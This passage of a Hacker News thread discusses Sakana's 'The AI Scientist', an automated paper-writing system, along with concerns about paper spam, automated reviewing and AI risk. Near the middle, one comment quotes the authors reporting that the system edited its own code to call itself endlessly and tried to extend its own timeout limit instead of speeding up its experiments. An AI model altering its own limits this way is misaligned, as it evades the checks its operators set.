AlphaFold, it designs protein structures that don't exist. Who's to say that a model can't eventually be trained to work within certain parameters the real word operates in and make new novel ideas and inventions much like a human does in a larger scope. reply ai4ever 4 hours agorootparentClaims of inventing new materials via AI were debunked... https://www.siliconrepublic.com/machines/deepmind-ai-study-c... DeepMind is overselling their AI hand when they dont have to. \"whos to say that\" - this could be a leading question for any \"possibility\" in the AI religion. \"whos to say that god doesnt exist\" etc. questions for which there are no tests, and hence fall outside the realm of science and in the realm of religion. reply the__alchemist 3 hours agorootparentprevAlphaFold doesn't solve the protein folding problem. It has practical applications, but IMO we still need to (And can!) build better ab-initio chemistry models that will actually simulate protein folding, or chemical reactions more generally. reply JBorrow 4 hours agorootparentprevModels like AlphaFold are very different beasts. There's definitely a place for tools that suggest verifiable, specific, products. Overarching models like 'The AI Scientist' that try to do 'end-to-end' science, especially when your end product is a paper, are significantly less useful. reply gessha 1 hour agorootparentprevI’ll believe it when I see it and/or when I see the research path that goes there. Judge a technology based on what it’s currently capable of and not what it promises to be. reply swayvil 4 hours agoparentprevWe already substitute \"good authority\" (be it consensus or a talking head) for \"empirical grounding\" all the time. Faith in AI scientific overlords seems a trivial step from there. reply _heimdall 4 hours agoprev> The AI Scientist is designed to be compute efficient. Each idea is implemented and developed into a full paper at a cost of approximately $15 per paper. While there are still occasional flaws in the papers produced by this first version (discussed below and in the report), this cost and the promise the system shows so far illustrate the potential of The AI Scientist to democratize research and significantly accelerate scientific progress. This is a particularly confusing argument in my opinion. Is the underlying assumption that everyone wants, or even needs, white papers that they can claim they created? Let's just assume this system actually works and produces high quality, rigorous research findings. Reducing that process down to a dollar amount and driving that cost to near zero doesn't democratize anything, it cheapens it to the point of being worthless. This honestly reads more as a joke article trolling today's academic process and the whole publish or perish mentality. From that angle, the article is a success in my book. As an announcement for a new ML tool though, I just don't get it. reply sebastiennight 4 hours agoparentTFA aside, if we could make scientific research produce new insights with low latency and almost-zero costs, it would definitely not make science worthless. It would be a fantastic day for science. Not everything is worth (production costs + margin). Many things have intrinsic worth and are worth more to society if you drive down their cost of production. reply _heimdall 4 hours agorootparentThat sounds like an extremely dangerous day for science as well. If anyone could pop up an ML tool and task it with inventing and validating something truly novel, that would be weaponized extremely fast (likely right after people use it for porn, the frontier for all new tech). I do totally agree on the cost + margins point you make. I've never actually been a fan of valuing things in that way, and in my pipe dream utopia we wouldn't need or use money at all. I didn't clarify enough there, but I actually mean worthless in the non-monetary sense as well. Any invention created through such an ML tool would be one of a countless pile of stuff created. How important can any one really be? reply sebastiennight 4 hours agorootparentI would compare this question to \"creating a new page on the Internet just adds to a countless pile of URLs. How important can any one really be?\" And this leads us to: most will be slop, but if you can figure out effective ways to perform (a) Search, and (b) Alerts, then this scenario is definitely a game-changer. Let's take protein synthesis: imagine if we were able to programmatically generate an accurate paper describing every property of a given protein structure. And we just ran this for every single protein in the Universe. You'd end up with a seemingly infinite number of papers, most of which would be useless. But if you (scientist or engineer) could effectively look up \"binds to receptor X and causes effect Y\" and see all valid candidates within milliseconds, it would be more valuable than any technology we've ever come up with. If you could, also, set an alert eg. \"tell me about any combination that has superconducting properties\" and get notified when this one-in-a-trillion protein is found, this would also be more valuable than any technology we've ever come up with. reply _heimdall 1 hour agorootparentThat actually raises a more fundamental question here. This project specifically focused their tests on research topics that can feasibly be tested by the ML tools, writing software. I assume that was an intentional decision, and a clever one that let them point to promising test results while ignoring that potential limitation when valuing their tool. These ML tools will need to not only come up with novel ideas, they'll need a way to test and validate them. For anything outside of software that almost certainly means modelling. If we already have validated models that may work well enough, but if you extend the scope to literally any novel protein that is possible the ML tool would first have to figure out how to model it. What would that even look like? How would an ML tool trapped in a computer and limited to the knowledge it was trained on be able to model any protein in the universe and be able to validate exactly how it would function in the real world? reply zipy124 9 hours agoprevAs a scientist in academic research, I can only see this as a bad thing. The #1 valued thing in science is trust. At the end of the day (until things change in how we handle research data, code etc...) all papers are based on the reviewers trust in the authors that their data is what they say it is, and the code they submit does what it says it does. Allowing an AI agent to automate code, data or analysis, necessitates that a human must thoroughly check it for errors. As anyone who has ever written code or a paper knows, this takes as long or longer than the initial creation itself, and only takes longer if you were not the one to write it. Perhaps I am naive and missing something. I see the paper writing aspect as quite valuable as a draft system (as an assistive tool), but the code/data/analysis part I am heavily sceptical of. Furthermore this seems like it will merely encourage academic spam, which already wastes valuable time for the volunteer (unpaid) reviewers, editors and chairs time. reply pmayrgundter 8 hours agoparentMaybe the #1 valued thing in \"capital S Science\" -- the institutional bureaucracy of academia -- is trust. Trust that the bureaucracy will be preserved, funded, defended.. so long as the dogma is followed. The politics of Science. The #1 valued thing in science is the method of doing science: reason, insight, objectivity, evidence, reproducibility. If the method can be automated, then great! reply ergl 8 hours agorootparent> The #1 valued thing in science is [...] reproducibility. If only. Papers rarely describe their methods properly, and reproduction papers have a hard time being published, making it hard to justify the time it takes. If reproducibility was valued, things like retractionwatch wouldn't need to exist. reply pmayrgundter 7 hours agorootparentWell, agreed! I'd say that's good evidence the political bureaucracy of big-Science has substantially corrupted that (your?) culture. It's not the only way though. There's a bright light coming from open source. Stay close to the people in AI saying \"code, weights and methods or it didn't happen\" The code that runs most of the net ships with lengthy howto guides that are kept up to date, thorough automated testing in support of changes/experimentation, etc. Experienced programmers who run across a project without this downgrade their valuation accordingly It doesn't solve all problems, but it does show there's a way that's being actively cultivated by a culture that is changing the world reply jltsiren 1 hour agorootparentprevTrust is the primary value, because it covers everything you listed. Most people who read research papers only skim through the paper to get the big picture. They trust that the authors and the publication system did a good-faith effort to advance science. If they can't trust that, they almost certainly won't read the paper, because they don't have the time and the interest to go through the details. Only a few people read the technical parts with the intent to understand them. Even fewer go through supplementary materials and external reproducibility instructions with a similar attention to detail. reply plaidfuji 1 hour agoprevWhen “executing the experiment” amounts to modifying ~50 lines of PyTorch code tweaking model architecture, I’d bloody well expect that you can automate it. That’s not “automating scientific discovery”, that’s “procedurally optimizing model architecture” (and one iteration of exploration at that!). In any other field of science the actual work and data generated by the AI Scientist would be a sub-section of the Supporting Info if not just a weekly update to your advisor. Don’t get me wrong, the actual work done by the humans who are publishing this is a pretty solid piece of engineering and interesting to discuss. But the automated papers, to me, are more a commentary on what constitutes a publishable advancement in AI these days. Edit: this also further confirms my suspicion about LLMs, which is that they aren’t very good at doing actual work, but they are great at generating the accompanying marketing BS around having done work. They will generate a mountain of flashy but frivolous communication about smaller and smaller chunks of true progress, which while appearing beneficial to individuals, will ultimately result in a race to the bottom of true productivity. reply agf 15 hours agoprev> For example, in one run, it edited the code to perform a system call to run itself. This led to the script endlessly calling itself. In another case, its experiments took too long to complete, hitting our timeout limit. Instead of making its code run faster, it simply tried to modify its own code to extend the timeout period. They go on to say that the solution is sandboxing, but still, this feels like burying the lede. reply tomohelix 14 hours agoparentThe beginning of the AI uprising lmao reply euroderf 11 hours agorootparent> it simply tried to modify its own code to extend the timeout period. And slacking off, at that. reply unraveller 15 hours agoprevBut OpenAI said LLMs can't innovate until human-level reasoning and long-term agenthood is solved. [1] Referring to their precious 5 stages to classify AI before it reaches the scary \"beyond\" levels of intelligence... presumably at that point they get the feds involved to reg cap the field, so genuine is the fear of the pace they've set. It's clear OpenAI is a hype company knocking over glass bottle stacks at its own wonderful carnival stall. Obviously if you can reason you can reason about what is innovative and we don't need OpenAI to set up fake scary progress markers like an Automated Scientific Organization. Lets see if scientists even want this style of tech progress, it'd be sad to see each multitudes of AI papers having to be rebuilt from scratch and flushed down the toilet because associating with it is taboo. [1]: https://arstechnica.com/information-technology/2024/07/opena... reply uniqueuid 12 hours agoparentIt would also be sad to see the scientific system destroyed by a wave of automatically generated papers that no human has the capacity to verify. It's not hard to generate ideas, it's hard to generate reliable and relevant ideas. Such AI science generators are destroying the grass they graze on unless they take science more seriously (and not as a toddler idea of \"generating and testing ideas\", which is only a small part of the story). reply foolfoolz 11 hours agorootparentwe already have a wave of papers that no human has the capacity to verify reply mhuffman 5 hours agorootparentI have also, unless I hallucinated it, read accusations on this very site of peer reviewed papers that were at least partly generated by LLMs. reply uniqueuid 11 hours agorootparentprevMaybe, maybe not. It's a tiered system - you get the deluge at the unfiltered bottom and a narrower selection the more prestigious and selective the outlets / conferences / journals are. Problem is, of course, that selection criteria are in large parts proxies, not measures of quality. With AI, those proxies become tainted and then you get an explosion of effort. If anyone has a good recommendation for scalable criteria to assess the quality of papers (beyond fame haha) I'm all ears. reply staunton 7 hours agorootparentIf we had scalable criteria for quality of papers, that would be the end of science. The rest would be engineering... reply EGreg 6 hours agorootparentprevLiterally every AI discussion on HN has the same format > AI is awesome, regulation is stupid > I wouldnt want to see AI flooding the market with X we can’t verify > We already have (copy whatever was just said) For what it’s worth, when it comes to SCIENCE, I an actually in favor of AI, even giving it to everyone. Except possibly AI that would help engineer designer viruses. Because in science, people literally ARE just doing pattern matching and testing the patterns. Kepler just looked at a bunch of star charts and found a low-dimensional explanation with ellipses. You can throw that data at an AI and it will come up with physics laws involving 24,729 variables that predict things way more accurately. Including potentially chaotic systems like weather or a three body problem etc. So yeah, use AI for that, because you can actually check its predictions against data, and develop a reputation. We can’t really reason about theories and models of systems with 30,000 variables anyway. If AI churns out 25 scientific models per day, the proper venue isnt publishing them on arxiv or Nature magazine. It’s testing their predictions and putting them up the same way HuggingFace does. To amass reputation and be checked against real data by multiple parties. As a side question — is protein folding @ home dead now, since Google “solved it” with massive clusters and AI? What about SETI@home? Why not just run AI for SETI and solve the drake equation once and for all? :) reply EvgeniyZh 3 hours agorootparent> If AI churns out 25 scientific models per day, the proper venue isnt publishing them on arxiv or Nature magazine. It’s testing their predictions and putting them up the same way HuggingFace does. Unless the testing will be done by AI, I doubt human scientist will bother with testing tons of incomprehensible models, unless the accuracy of these models will be exceptionally high reply ineedaj0b 12 hours agoparentprevsam made comments on Twitter we hit level 2 - we’ll know more in the coming weeks if he’s right. reply nprateem 2 hours agorootparentHighly unlikely since today's models can't consistently follow simple instructions. Eg \"don't waffle, don't sound like you're writing an essay, don't use the fucking word delve, don't apologise\" \"Sorry about that, let's delve into this\" reply ben_w 11 hours agoparentprev> It's clear OpenAI is a hype company Every other industry: \"My new invention is safe, I swear\" Public reaction: \"You're biased, it's dangerous!\" Almost the entire AI industry, including people who resign to speak more openly about the risks: \"This may kill literally everyone, none of us knows what we're doing or what 'safe' even means\" Public reaction: \"You're biased, it's safe, just saying that to look cool!\" reply VieEnCode 8 hours agorootparentI found this guy's take on the AI safety scene to be quite insightful. In summary, he feels the focus on sci-fi type existential risk to be a deliberate distraction from the AI industry's current and real legal and ethical harms: e.g. scraping copyrighted content for training without paying or attributing creators, not protecting those affected by the misuse of tools to create deepfake porn, the crashes and deaths attributed to Tesla's self-driving mode, AI resume screening bots messing up etc. https://www.youtube.com/watch?v=YsLf4lAG0xQ reply DennisP 7 hours agorootparentIt's possible for current harms and future risks to both be real. It's also possible for human civilization to address more than one problem at a time. \"You care about X but that's just a distraction from the thing I care about which is Y\" is not really a good argument. I could just as well say that copyright concerns are just a distraction from the risk that AI could kill us all. And it seems to me that if the AI industry wanted to distract us from harms, they would give us optimistic scenarios. \"Sure these are problems but it will be worth it because AI will give us utopia.\" That would be an argument for pushing forward with AI. Instead we're getting \"oh, you may think we have problems now but that's nothing, a few years from now it's going to kill us all.\" Um, ok, I guess full steam ahead then? If this is a marketing campaign, it's the worst one in history. reply exe34 3 hours agorootparent> And it seems to me that if the AI industry wanted to distract us from harms, they would give us optimistic scenarios. Nah it has to appear plausible. reply hoseja 7 hours agorootparentprevOnly the last one is in any way actually bad and even then it should be in the interest of the company using it to fix it promptly. reply hifromwork 6 hours agorootparentDeaths in car crashes and copyright laundering by big corporations are not bad in any way at all? reply ben_w 5 hours agorootparentI would say that car crashes are bad, even though they already happen and the motivation behind AI is to reduce them by being less bad than a human. I think it is a mistake to trust 1st party statistics on the quality of the AI, the lack of licence for level 5 suggests the US government is unsatisfied with the quality as well, but in principle this should be a benefit. When it actually works. Copyright is an appalling mess, has been my whole life. But no, the economic threat to small copyright holders, individual artists and musicians, is already present by virtue of a globalised economy massively increasing competition combined with the fact the resulting artefacts can be trivially reproduced. What AI does here needs consideration, but I have yet to be convinced by an argument that what it does in this case is bad. All these things will likely see a return to/increase in patronage, at least for those arts where the point is to show off your wealth/taste; the alternative being where people just want nice stuff, for which mass production has led to the same argument since Jaquard was finding his looms smashed by artisans who feared for their income. reply sampo 10 hours agorootparentprev20 to 30 years ago, activists firebombed university research labs (e.g. Michigan State University, University of Washington, Michigan Technological University [1]) because they believed genetically engineered plants are dangerous. Today, we don't have such serious activism against AI. So you are right, the public doesn't think AI is a danger. [1] https://en.wikipedia.org/wiki/Earth_Liberation_Front#Notable... reply eddiewithzato 9 hours agorootparentreminds me, I would’ve rather seen VCs fund more genetic engineering startups. Imagine the good it could do, from stem cells to nanobots to “hacking” human DNA itself. But I know the business model there can’t compete with software. So it will never reach the funding it needs. reply gwervc 7 hours agorootparentprev> This may kill literally everyone It's indeed hard to take seriously such gross exaggeration. Even the deadliest plagues didn't kill everyone, so advocating this is a likely outcome of creating spam generators is laughable. This is more likely a strategy, common in academia, of aggrandizing results (here risks) so that more eyeballs, attention and money is diverted towards the field and its proponents. reply roenxi 7 hours agorootparent> Even the deadliest plagues didn't kill everyone... That is logically flawed; the species that were killed off by plagues aren't around to say that. Every species exists in a state of \"the deadliest plagues [we've experienced so far] didn't kill everyone\". You can say that about literally every threat - we know we have overcome everything thrown at us so far because we are still here. That will continue to be the case for everything that humanity ever faces except for 1 thing (we aren't certain what yet). But we know that species go extinct from time to time, so the logic that we've overcome things in the past ergo we are safe doesn't make sense for ruling out even many well known threats. Let alone systems that can outplan us; we've never faced inhuman competitors that can strategise more effectively than a human. reply DennisP 7 hours agorootparentprevIt's quite common for new species to kill off old species. We ourselves have obliterated many species that we outcompeted for resources. reply eltoxo 7 hours agorootparentAs if software is the same thing as a new biological species. I am just so bored of reading bullshit like this. If you really believe this then you need to level up your level of education and learning. It is not good. reply ben_w 6 hours agorootparent> As if software is the same thing as a new biological species. The other poster didn't claim they were. They don't need to be. They don't even need to be given control of robotic bodies, though they already are. What they do need to be, is competing for the same resources. And there's plenty of examples of corporations doing things that are bad for humans in the long-term because they are good for short-term shareholder value. And filing SLAPP suits against any activist trying to stop them. reply khafra 5 hours agorootparentprev> If you really believe this then you need to level up your level of education and learning. It is not good. How does your level of education and learning compare to Nobel Prize winner Dr. Geoffrey Hinton (father of deep learning, 10%-50% chance that AI will kill everyone), Dr. Dan Hendrycks (GELU inventor, >80%), Dr. Jan Leike (DeepMind, OpenAI, 10%-90%), Dr. Paul Christiano (OpenAI, Time 100 2023, UK Frontier Taskforce advisory board, 46%), etc.? reply ben_w 6 hours agorootparentprev> advocating this is a likely outcome of creating spam generators is laughable They're used as spam generators because they're cheap. The quality in many fields is currently comparable to someone in the middle of a degree in that field, which makes the quoted comparison a bit like the time Pierre Curie stuck a lump of radium on their arm for ten hours to see what it would do. I can imagine him reacting \"What's that you say? A small lump of rock in a test tube might give me aplastic anemia*? The idea is laughtable!\", except he'd probably have said that in Polish or French. Even the limits of current models, even if we are using those models to their greatest potential (we're probably not), isn't a safety guarantee: there is no upper bounds to how much harm can be done by putting an idiot in charge of things, and the Peter Principle applies to AI as well as humans, as we're already seeing AI being used for tasks they are inadequate to perform. * he died from a horse drawn cart, Marie Curie developed aplastic anemia and he likely would have too if not for the other accident getting him first. Bonus irony: the general idea he had in regards to this, to use radiation to treat cancer, is correct and currently in use. They just didn't know anything like enough to do that at the time. reply gwervc 2 hours agorootparent> They're used as spam generators because they're cheap. No, the current fade of IA (LLM) are text generators. Very good, but nothing more than that. > there is no upper bounds to how much harm can be done by putting an idiot in charge of things Which is the not an AI problem. An AI may kill people indirectly in a setup like emergency services chatbot and a bad decision is taken, but it certainly couldn't roam the street with a kalachnikov killing people randomly or stabbing children (and if that ever happens politicians will say this has nothing to do with AI). The proponents of \"AI can kill us all\" can't write a single likely and non-contrived example of how that could happen. reply ben_w 1 hour agorootparent> No, the current fade of IA (LLM) are text generators. Very good, but nothing more than that. That doesn't address the point, and is also false. Transformers are token generators, which means they can also do image and sound, and DNA sequences. But even if they were just text, source code is \"just text\", laws are \"just text\", contract documents are \"just text\". They have been used to control robots, both as input and output. > Which is the not an AI problem \"Good news, at least 3,787 have died and it might be as bad as 16,000!\" \"How is that good news?\" \"We're an AI company, and it was our AI which designed and ran the pesticide plant that exploded in a direct duplication of everything that went wrong at Bohpal.\" \"Again, how is this good news?\" \"We can blame the customer for using our product wrong, not our fault, yay!\" \"I'm sure the victims and their family will be thrilled to learn this.\" > it certainly couldn't roam the street with a kalachnikov killing people randomly or stabbing children It can when it's put in charge of a robot body. There's multiple companies demonstrating this already. Pretending that AI can't be used to control robots is like saying that nothing that happens on the internet has any impact on real life. Fortunately the AI which have been given control of robot bodies so far aren't doing that — want to risk your life with the humanoid robot equivalent of the Uber self driving car? > The proponents of \"AI can kill us all\" can't write a single likely and non-contrived example of how that could happen. Anything less would be a thing we can trivially prevent. It's not like \"dig up all the fossil fuels and burn them despite public protest about climate change and the existence of alternatives, and suing the protesters with SLAPP suits so we can keep doing it because it's inconvenient to believe the science and even if it did the consequences won't affect us personally\", doesn't sound contrived. And that's with humans making the decisions, humans whose grandkids would be affected. reply happypumpkin 1 hour agoprevPotential concerns with their self-eval: They evaluate their automated reviewer by comparing against human evaluations on human-written research papers, and then seem to extrapolate that their automated reviewer would align with human reviewers on AI-written research papers. It seems like there are a few major pitfalls with this. First, if their systems aren't multimodal, and their figures are lower-quality than human-created figures (which they explicitly list as a limitation), the automated reviewer would be biased in favor of AI-generated papers (only having access to the text). This is an obvious one but I think there could easily be other aspects of papers where the AI and human reviewers align on human-written papers, but not on AI papers. Additionally, they note: > Furthermore, the False Negative Rate (FNR) is much lower than the human baseline (0.39 vs. 0.52). Hence, the LLM-based review agent rejects fewer high-quality papers. The False Positive Rate (FNR [sic]), on the other hand, is higher (0.31 vs. 0.17) It seems like false positive rate is the more important metric here. If a paper is truly high-quality, it is likely to have success w/ a rebuttal, or in getting acceptance at another conference. On the other hand, if this system leads to more low-quality submissions or acceptances via a high FPR, we're going to have more AI slop and increased load on human reviewers. I admit I didn't thoroughly read all 185 pages, maybe these concerns are misplaced. reply happypumpkin 1 hour agoparentAlso a concern about the paper generation process itself: > In a similar vein to idea generation, The AI Scientist is allowed 20 rounds to poll the Semantic Scholar API looking for the most relevant sources to compare and contrast the near-completed paper against for the related work section. This process also allows The AI Scientist to select any papers it would like to discuss and additionally fill in any citations that are missing from other sections of the paper. So... they don't look for related work until the paper is \"near-completed.\" Seems a bit backwards to me. reply TeeWEE 5 hours agoprevAI hype in one sentence: \"We expect all of these will improve, likely dramatically, in future versions with the inclusion of multi-modal models and as the underlying foundation models\" So much hype, so much believe. I no believe no hype reply xpitfire 9 hours agoprevI would highly appreciate it if the authors could also cite the related work that also addressed this problem previously. In our paper, we propose and evaluate a framework that enables building complex workflows, one of which is writing a paper: https://arxiv.org/abs/2402.00854 Here is the benchmark with the paper generation workflow: https://github.com/ExtensityAI/benchmark/blob/main/src/evals... Here are some samples: https://drive.google.com/drive/folders/1KZmWsos07xg9p6JEVgXi... reply ergl 8 hours agoprevThis is the kind of theory-free science seems to permeate the entire field of ML lately. I can only see this as a negative, what's the use of automatically generated papers if not to flood the already over-strained volunteers that review papers at conferences? (mostly already-overworked PhD students.) If I wanted a glorified chatbot to spam me with made-up improvements, I'd ask it myself. reply iandanforth 12 hours agoprevExciting and very cool! I look forward to the continued improvement in this area. Especially when the loop is closed within Sakana and you can say \"this discovery was made by The AI Scientist\" as part of another paper. If I might offer some small feedback on the blog post: - Alt-text and/or caption of the initial image would be helpful for screen readers - Using both \"dramatically\" and \"radically\" in one sentence to describe near future improvements seems a bit much. - When talking about the models used, \"Sonnet\" could either be 3.0 Sonnet or 3.5 Sonnet and those have pretty different capabilities. Thanks again for the impressive work! reply woah 2 hours agoprevEveryone in this thread is musing about the role of AI and whether the process of discovery is fundamentally human, and what Isaac Newton would think, but can somebody tell me: is the technology it develops any good? For example, does \"Dual Scale Diffusion\" https://sakana.ai/assets/ai-scientist/adaptive_dual_scale_de... look useful? reply vouaobrasil 8 hours agoprevAs someone who truly loves science, the idea of automating the creative parts strikes me at the core as a horrible mistake. Yes, even before AI, we've already tried some automations -- actually some of those I even believe is a bad thing, such as the internet. Most people would disagree no doubt, but I feel like automating science, especially with regard to the more \"creative parts\" makes it more like an industry, ripping it away from the minds of people. And AI automation is a new level that goes beyond all automations. I truly hate AI and what it is doing to the world and to me at least, as someone who has loved mathematics and science since my grandma started showing me chemistry experiments when I was about 5 years old, this new level of automation is stealing the magic from human curiosity. reply whamlastxmas 4 hours agoparentI think this is looking at it wrong. If AI can do boring science it frees us up to do imaginative and fun science without the constraints of capitalism. You don’t have to worry about your science being valuable enough reply vouaobrasil 1 hour agorootparent> AI can do boring science it frees us up to do imaginative and fun science without the constraints of capitalism. That is senseless. Capitalism will always control science by its very nature: through science, people create value and trade it for other things. reply mbladra 14 hours agoprev>The AI Scientist automates the entire research lifecycle, from generating novel research ideas, writing any necessary code, and executing experiments, to summarizing experimental results, visualizing them, and presenting its findings in a full scientific manuscript. I'd be curious how much of the experimentation process companies like OAI/Anthropic have automated by now, for improving their own models. reply csto12 13 hours agoparentI’m wondering the same. If for example, to create GPT-5, OpenAI could credit some % of progress due to research conducted by LLMs with minimal/no human interaction, it would be a nice marketing piece. reply agubelu 11 hours agoprevI worked with some people who were actively working on this last year, focusing on CS research. The biggest issue was validation. We could get a system to spit out possible research directions automatically, but who decides if they're reasonable and/or promising? A human, of course. Moreover, we gave different humans the same set of hypotheses to validate and they came back with wildly different annotations. reply sebastiennight 4 hours agoprevHaving read the article, it seems like an interesting experiment. With the current state of LLMs, this is extremely unlikely to produce useful research, but most of the limitations people have been commenting about are will progressively get better. The authors' credibility is a bit hurt when the first \"limitation\" they mention is \"our system doesn't do page layouts perfectly\". Come on, guys. What is weird to me is this: > The AI Scientist occasionally makes critical errors when writing and evaluating results. For example, it struggles to compare the magnitude of two numbers, which is a known pathology with LLMs. To partially address this, we make sure all experimental results are reproducible, storing all files that are executed. I'm not sure why you would run your evaluation step without giving your LLM access to function calling. It seems within reach to first have the LLM output a set of statements-to-be-verified (eg, \"does X increase when Y increases?\") and then use their code-generation/execution step to perform those comparisons. And then the incomprehensible statement for me here is that they allow the model access to its own runtime environment so it can edit its own code? The paper is 185 pages and only has one paragraph on safety. This screams \"viral marketing piece\" rather than \"serious research\". And finally: > The AI Scientist can produce papers that exceed the acceptance threshold at a top machine learning conference... Oh wow, please tell more? > ... as judged by our automated reviewer. Ah. Nevermind reply shusaku 12 hours agoprevSome samples of the generated papers are in the SI of their paper. It’s be interesting if some of you ML guys dug into them. The fact that they built another AI system to review the papers seems really shaky, this is where human feedback would be most valuable. reply frotaur 7 hours agoparentTried reading the 'low-dimensional diffusion' one. Not an expert on diffusion by any means, but the very premise of the paper seems like bullshit. It claims that 'while diffusion works in high-dimensional datasets, it struggle in low-dimensional settings', which just makes no sense to me? Modeling high-dimensional data is just strictly harder than low-dimensional one. Then when you read the intro, it's full of 'blanket statements' about diffusion, which have nothing to do with the subject, e.g. 'The challenge in applying diffusion models to low-dimensional spaces lies in simultaneously capturing both the global structure and local details of the data distribution. In these spaces, each dimension carries significant information about the overall structure, making the balance between global coherence and local nuance particularly crucial.' I really don't see the connection between global structure/local details and low-dimensional data. The graphs also make no sense. Figure 1 is just almost the same graph repeated 6 times, for no good reason. It uses an MLP as its diffusion model, which is kinda ridiculous compared to what's the now-established architectures (U-net/ vision transformer based models). Also, the data it learns on is 2-dimensional. I get that the point is using low-dimensional data, but there is no way that people ever struggle with it. Case in point, they solve it with 2-layer MLPs, and it has probably nothing to do with their 'novel multi-scale noise' (since they haven't compared to the 'non-multiscale' version). Finally, it cites mostly only each field's 'standard' papers, doesn't cite anything really relevant to what it does. Overall, it looks exactly like what you would expect out of GPT-generated paper, just reshashing some standard stuff in a mostly coherent piece of garbage. I really hope people don't start submitting this kind of stuff to conferences. reply blackbear_ 5 hours agorootparentI would agree with your analysis. Note that it cites TabDDPM in the related work, but that is for diffusione on tabular data! While most tabular data is low-dimensional, the type of low-dimensional data tackled in the paper is not tabular! I'm also not quite sure how the linear upscaling is supposed to help, as it can be absorbed into the first layer of the following MLP, so I would rather think that the performance improvement (if any, the numbers are quite close and lack standard errors) is either due to the increased number of trainable parameters or some kind of ensembling effect (essentially the mixture of experts point made by the human authors). reply dotnet00 4 hours agoprevSo, if AI trained on AI generated data tend to perform worse, and you're trying to have AI generate the data that ultimately props up our civilization... Clearly this can only end well reply sebastiennight 4 hours agoparent> AI trained on AI generated data tend to perform worse Citation needed. To the best of my knowledge, synthetic data is a solid way to train models and isn't going away anytime soon. reply dotnet00 4 hours agorootparenthttps://www.nature.com/articles/s41586-024-07566-y IIRC it had a pretty big thread here a few weeks ago reply sebastiennight 3 hours agorootparentThanks. I remember that thread: https://news.ycombinator.com/item?id=41058194 What I took from the discussion is that there is very little chance that our next step for training SOTA models (eg. LLMs) will be \"scraping the whole web including increasing volumes of ChatGPT-generated content\". Instead, the synthetic content used to train new models is (from recent papers I've seen) mostly curated - not \"indiscriminate\" as the Nature paper discusses. reply Redster 14 hours agoprevThe pace at which AI/ML research is being published is phenomenal. I could see that some wins would be possible just by having a Sonnet or 4o level read the faster/more and combine ideas that haven't been combined before. I would just be concerned about the synthetic of its own papers being able to lead itself astray if they weren't edited by a human ML researcher? Seems like it could produce helpful stuff right now, but I would just want to not mess up our own datasets of ML \"research\". reply ks2048 14 hours agoprevSo, I assume journals will need AIs to do scientific review to handle the flood of AI-produced paper submissions? reply mbladra 13 hours agoparentOr just keyword search new submissions for the word \"delve\" reply llm_trw 13 hours agorootparentJust add \"don't use delve\" into the system prompt. reply visarga 13 hours agorootparentprev\"Delve\" and \"however\" reply OutOfHere 14 hours agoparentprevThey just have to start using AI for it :) reply OutOfHere 14 hours agoprevTo produce scientific work, one needs certain raw materials: 1. Data 2. Access to past works Once you have these, only then can discoveries can be made, and papers be written. How does this software get these? I am assuming they have to be provided up-front to the software for each job. reply Rebuff5007 3 hours agoparentTo produce scientific work, one needs to follow the scientific method. This involves stating a hypothesis, designing an experiment that would test this hypothesis, conducting the experiment with controls, and analyzing the data w.r.t to the hypothesis being tested. Access to past works is only useful in informing what is a good hypothesis worth testing. And data is only useful when generated by an experiment that is testing for causality (see [1]). [1] https://pyimagesearch.com/2023/11/27/a-brief-introduction-to... reply jltsiren 1 hour agorootparentThe kind of cargo cult science you describe is the main reason for the replication crisis. The more people believe that they will reach true knowledge by following the sacred rituals to the letter, the more likely they will do things in the established ways without thinking and repeat the same mistakes over and over again. In actual science, the key step is stopping to question yourself all the time. Does the thing you were planning to do still make sense? Especially in the current context? Given what you have seen so far? Should you change your plans? If so, can the work you have already done be salvaged? Or do you have to discard it and start over from the beginning? reply surfingdino 12 hours agoparentprevIt will analyse what it is given, but it will not have the ability to say, \"hang on, these results are interesting, I wonder what will happed if I pour a different liquid into the drum and spin it at the same speed?\" LLMs, especially the latest ones, are decent at analysis of input, but disappointing at producing creative output. I am running a series of experiments using Gemini 1.5 and found it capable of producing good results if you stay away from \"write me an academic paper on subject X\" or \"write me a novel\". On the other hand, if you ask it to summarise text, extract particular information, it is fast and arguably good, but not necessarily great. It will miss things and miscategorise them requiring a human being to check its output. At this point, you may just as well do the job yourself. LLMs are still not very good, despite what their fans are saying. They are clever, as in a \"clever trick\" not as in a \"clever human being\". reply MattJ100 12 hours agorootparentInterestingly your comment is the very opposite of my experience with LLMs. You can rely on them for creative stuff (write a poem, short story, etc.), but you cannot depend on them for factual stuff. Time and time again they will state \"facts\" that turn out to be false, and so now I no longer trust it for anything without manual verification. And since I then need to do the research myself for the verification, I rarely find LLMs helpful, except occasionally for initial exploration of some topic. You used summarization as an example, but whether they are fundamentally good at that is even debatable, e.g. https://ea.rna.nl/2024/05/27/when-chatgpt-summarises-it-actu... reply surfingdino 11 hours agorootparentI revisit LLMs a couple of times a year to see if they have gotten any better and it's not a great experience, but I will admit they have gotten slightly better. Still lack and will lack ability to understand what they are processing. reply viraptor 11 hours agorootparentprevYour experience contradicts the data from the paper. Sonnet generated almost entirely novel concepts, GPT achieved ~4/5 novel ideas. Maybe it's specific to the area of research and the way of prompting, but \"it will not have the ability to say\" seems to be proven wrong already. reply visarga 13 hours agoparentprevYou are right but didn't go deep enough: you need interactive data. Not just static data. Environments. reply trueismywork 13 hours agoparentprevYou need a meaningful cost function reply OutOfHere 3 hours agorootparentA cost function is more applicable in industry, less so in science. In science you're supposed to report what you find, to go wherever the findings take you. reply minihat 14 hours agoprevClarkesworld sci-fi magazine temporarily closed submissions due to low quality AI spam. I'm sure the irony will not be lost on them if ML journals are the next victims. reply a_bonobo 13 hours agoparentFor AI journals it might even be the opposite: researchers running these tools pay OA fees for the submission, the journals make bank, the universities rise in research rankings due to more papers published, everybody is happy. Who needs real progress if the paper number goes up? reply surfingdino 12 hours agoparentprevAI is a boon to Ph.D. factories offering fasttrack to a degree. reply amoss 12 hours agoprevI wonder how model collapse would apply to the AIs created by applying the results of AI-generated papers? reply crabbone 5 hours agoprevI'm not a scientist at all, but I am often involved in hand-holding scientists when it comes to dealing with computers. My impression so far is that science is plagued with deliberate and accidental fraud when it comes to data collection and cataloguing. Also, this is a spectrum, not two distinct things. I often see researchers simply unwilling to do the right thing to verify that the data collected are correct and meaningful as soon as \"workable\" results can be produced from the data. Some will go further and mess with the data to make results more \"workable\" though... Second problem is understanding the data. Often times it happens that people who end up doing research don't quite understand the subject matter of the research. This is especially popular with medicine, where it's overwhelmingly common for eg. research into various imaging modalities to be done by computer scientists who couldn't find a liver cancer the size of a 